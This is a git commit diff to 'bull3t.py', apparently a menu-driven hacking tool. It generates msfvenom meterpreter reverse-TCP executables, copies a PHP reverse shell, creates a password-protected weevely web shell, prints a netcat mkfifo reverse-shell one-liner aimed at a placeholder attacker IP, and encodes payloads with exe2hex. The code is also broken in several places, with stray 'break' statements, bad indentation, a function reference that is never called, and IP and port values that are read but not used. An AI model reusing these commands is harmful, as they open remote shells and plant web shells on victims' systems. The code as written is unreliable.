27785fc2baf86af896abaaf3d1f4dbde3988bfbb
ahmad-shakla <66517841+ahmad-shakla@users.noreply.github.com>
2021-02-07 16:53:30 +0000

    Update bull3t.py

--- bull3t.py
+++ bull3t.py
@@ -1,4 +1,5 @@
 import os
+import webbrowser
 def banner():
         
         print ("""
@@ -23,14 +24,12 @@ _|_________         _________|_
 =======>>   1.Create an encrypted metasploit windows payload
 =======>>   2.Create a php payload (pentest-monkey)
 =======>>   3.Create a php payload with password
-=======>>   3.Create a python payload
-=======>>   4.Create a shell-script payload
+=======>>   4.Create a NetCat payload
 =======>>   5.Create payloads injected with images
-=======>>   6.Create encrypted payoads injected with images 
+=======>>   6.Just open PayloadsAllTheThings 
         
         
         """)
-        trigger = input("TRIGGER >>")
 
        
 def install():
@@ -47,12 +46,62 @@ def install():
 def metasploit_payload():
         
         os.system("echo Enter your ip : ;read ip; echo Enter your port : ;read port; msfvenom -p windows/meterpreter/reverse_tcp -o /root/payload.exe; clear; echo payload generated")
+        break;
 def php_payload():
         
         os.system("cp /usr/share/webshells/php/php-reverse-shell /root/php-payload.php; clear; echo pentest-monkey php payload is now in your /root directory")
-
+        break;
 def php_payload_with_password():
         os.system("echo Enter your password : ;read password; weevely generate ${password} /root/php-payload-passwd.php; clear; echo weevey payload is now in your /root directory")
+        break;
+        
+def payload_with_picture():
 
+        print ("Here are your insturctions ...")
+        webbrowser.open('https://null-byte.wonderhowto.com/how-to/hacking-macos-hide-payloads-inside-photo-metadata-0196815/')
+        break;
+def netcat_payload():
+        print ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR-IP YOUR-PORT >/tmp/f")
+        print ("Here is your payload ... happy hacking")
+        break;
+      
+def payloads_all_the_things():
+
+        print ("Opening PayloadsAllTheThings")
+        webbrowser.open('https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md')
+        break;
+ def encrypted_metasploit_payload():
+        os.system("echo Enter your payload : ; read msfvenom; exe2hex -x ${msfvenom} -b payload.bat -p payload.ps1 -cc -v; clear; echo payload generated in .bat and .ps1 extension")
+        break;
 install()
 banner()
+
+user = input ("Trigger)")
+x = 4
+while x != 5 :
+        if user == "0" :
+                print ("Thanks for using the tool ")
+                break;
+         elif user == "1" :
+                encrypted_metasploit_payload()
+                
+         elif user == "2" :
+                php_payload()
+                
+         elif user == "3" : 
+                php_payload_with_password()
+                
+         elif user == "4" :
+                netcat_payload()
+                
+         elif user == "5" : 
+                payload_with_picture
+                
+         elif user == "6" :
+                payloads_all_the_things()
+                
+         else :
+                x = 5
+                print ("Incorrect command\n")
+                user = input ("Trigger)")
+                x = 4
